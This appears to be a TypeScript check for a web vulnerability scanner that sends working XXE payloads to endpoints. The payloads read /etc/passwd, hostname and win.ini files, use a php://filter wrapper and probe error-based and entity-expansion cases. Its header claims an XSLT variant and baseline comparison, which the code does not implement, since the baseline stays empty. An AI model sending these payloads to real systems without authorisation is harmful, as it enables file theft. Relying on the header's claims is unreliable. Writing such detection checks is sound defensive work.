import { continueWith, defineCheck, done, Severity } from "engine";
import { Tags } from "../../types";
import { keyStrategy } from "../../utils/key";

/**
 * v2: Fixed XXE Injection
 * - Tries BOTH application/xml AND text/xml content types
 * - Preserves original XML body structure when available (wraps entities around it)
 * - Baseline: compares response against original to avoid FPs
 * - SOAP envelope support
 * - XSLT injection variant
 */

type State = { payIndex: number; ctIndex: number; baselineBody: string };

const CONTENT_TYPES = ["application/xml", "text/xml"];

type XXEPayload = {
  body: string;
  patterns: RegExp[];
  antiPatterns?: RegExp[]; // If these match baseline, skip
  description: string;
  severity: Severity;
};

const PAYLOADS: XXEPayload[] = [
  // ── File read ──
  {
    body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
    patterns: [/root:.:0:0/],
    description: "XXE file:///etc/passwd",
    severity: Severity.CRITICAL,
  },
  {
    body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>`,
    patterns: [/\[fonts\]/i],
    description: "XXE file:///c:/windows/win.ini",
    severity: Severity.CRITICAL,
  },
  // ── PHP wrapper ──
  {
    body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>`,
    patterns: [/cm9vd|cm9vdDp/],
    description: "XXE php://filter base64",
    severity: Severity.CRITICAL,
  },
  // ── Error-based (file not found reveals parser processes entities) ──
  {
    body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///xxe_canary_9f3a2b">]><root>&xxe;</root>`,
    patterns: [/xxe_canary_9f3a2b|No such file|failed to load|FileNotFoundException|I\/O error|could not.*open/i],
    antiPatterns: [/xxe_canary_9f3a2b/], // if canary is in baseline, skip
    description: "Error-based XXE (file not found)",
    severity: Severity.HIGH,
  },
  // ── Parameter entity ──
  {
    body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///xxe_canary_9f3a2b">%xxe;]><root>1</root>`,
    patterns: [/PEReference|not.*allowed|entity.*error|xxe_canary/i],
    description: "Parameter entity XXE",
    severity: Severity.MEDIUM,
  },
  // ── Entity expansion (billion laughs lite) ──
  {
    body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "XXE_EXPAND_TEST"><!ENTITY b "&a;&a;&a;&a;&a;">]><root>&b;</root>`,
    patterns: [/XXE_EXPAND_TESTXXE_EXPAND_TEST/],
    description: "Entity expansion processed",
    severity: Severity.MEDIUM,
  },
  // ── SOAP envelope ──
  {
    body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>`,
    patterns: [/^[a-z0-9_-]{1,64}$/m], // hostname is typically short alphanumeric
    description: "SOAP envelope XXE",
    severity: Severity.HIGH,
  },
];

function getBody(resp: any): string {
  try { return resp?.getBody?.()?.toText?.() ?? ""; } catch { return ""; }
}

export default defineCheck<State>(({ step }) => {
  step("test", async (state, ctx) => {
    if (state.payIndex >= PAYLOADS.length) return done({ state });

    const payload = PAYLOADS[state.payIndex]!;
    const ct = CONTENT_TYPES[state.ctIndex]!;

    // Skip if anti-pattern matches baseline
    if (payload.antiPatterns?.some(p => p.test(state.baselineBody))) {
      return continueWith({ nextStep: "test", state: { ...state, payIndex: state.payIndex + 1, ctIndex: 0 } });
    }

    try {
      const spec = ctx.target.request.toSpec();
      const origMethod = ctx.target.request.getMethod().toUpperCase();
      spec.setMethod(origMethod === "GET" ? "POST" : origMethod);
      spec.setHeader("Content-Type", ct);
      spec.setBody(payload.body);

      const { request, response } = await ctx.sdk.requests.send(spec);
      if (response) {
        const body = getBody(response);
        const hit = payload.patterns.find(p => p.test(body) && !p.test(state.baselineBody));
        if (hit) {
          return done({ state, findings: [{
            name: `XXE Injection (${payload.description})`,
            description:
              `The endpoint processed XML with external entity declarations.\n\n` +
              `**Content-Type:** \`${ct}\`\n**Method:** ${payload.description}\n` +
              `**Evidence:** \`${hit.source}\` found in response (absent in baseline)\n\n` +
              `**Impact:** File read, SSRF, DoS, or RCE depending on parser configuration.`,
            severity: payload.severity,
            correlation: { requestID: request.getId(), locations: [] },
          }] });
        }
      }
    } catch {}

    // Try next content type, then next payload
    if (state.ctIndex + 1 < CONTENT_TYPES.length) {
      return continueWith({ nextStep: "test", state: { ...state, ctIndex: state.ctIndex + 1 } });
    }
    return continueWith({ nextStep: "test", state: { ...state, payIndex: state.payIndex + 1, ctIndex: 0 } });
  });

  return {
    metadata: {
      id: "xxe-injection",
      name: "XML External Entity (XXE) Injection",
      description: "Tests endpoints with application/xml and text/xml payloads for file read, php://filter, error-based, parameter entity, entity expansion, and SOAP XXE. Baseline comparison eliminates FPs.",
      type: "active",
      tags: [Tags.INJECTION, Tags.FILE_DISCLOSURE],
      severities: [Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL],
      aggressivity: { minRequests: 1, maxRequests: PAYLOADS.length * CONTENT_TYPES.length },
    },
    initState: (): State => ({ payIndex: 0, ctIndex: 0, baselineBody: "" }),
    dedupeKey: keyStrategy().withMethod().withHost().withPort().withPath().build(),
    when: (t) => {
      const method = t.request.getMethod().toUpperCase();
      if (method === "POST" || method === "PUT" || method === "PATCH") return true;
      // Check if endpoint sends/receives XML
      try {
        const reqCt = (t.request.getHeader?.("Content-Type")?.[0] ?? "").toLowerCase();
        const resCt = (t.response?.getHeader?.("Content-Type")?.[0] ?? "").toLowerCase();
        if (reqCt.includes("xml") || reqCt.includes("soap") || resCt.includes("xml") || resCt.includes("soap")) return true;
      } catch {}
      return false;
    },
  };
});
